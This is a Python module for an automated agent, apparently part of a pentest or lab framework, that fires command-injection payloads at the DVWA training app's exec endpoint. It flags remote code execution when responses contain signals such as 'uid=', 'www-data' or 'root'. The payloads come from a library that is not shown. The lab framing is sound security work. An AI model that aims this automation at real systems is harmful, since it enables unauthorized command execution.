"""Tier 1 command injection agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import make_update, module_endpoint, normalize_security_level
from core.state import ExploitationState
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


CMD_EXEC_SIGNALS = ["uid=", "www-data", "root", "daemon", "bin/bash"]


class CommandInjectionAgent(BaseAgent):
    module_name = "cmdi"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/exec/")
        payload_set = self.payloads.get(self.module_name, level)

        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        payloads = (
            list(payload_set.probe)
            + list(payload_set.bypass.get(level, []))
            + list(payload_set.exploit)
        )

        session = DVWASession(target_url)
        try:
            for payload in payloads:
                tried_now.append(payload)
                response = session.post(endpoint, data={"ip": payload, "Submit": "Submit"})
                body = response.text or ""

                if body.strip():
                    score = max(score, 1)

                if self.verifier.contains_any(body, CMD_EXEC_SIGNALS).ok:
                    score = 4
                    confirmed = ["cmd_injection_confirmed", "rce_achieved"]
                    outcomes = ["rce_achieved"]
                    break
                if self.verifier.regex_match(body, [r"uid=\d+", r"gid=\d+"]).ok:
                    score = max(score, 3)
                    if "cmd_injection_confirmed" not in confirmed:
                        confirmed.append("cmd_injection_confirmed")
        except Exception:
            pass
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = CommandInjectionAgent()


def cmdi_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
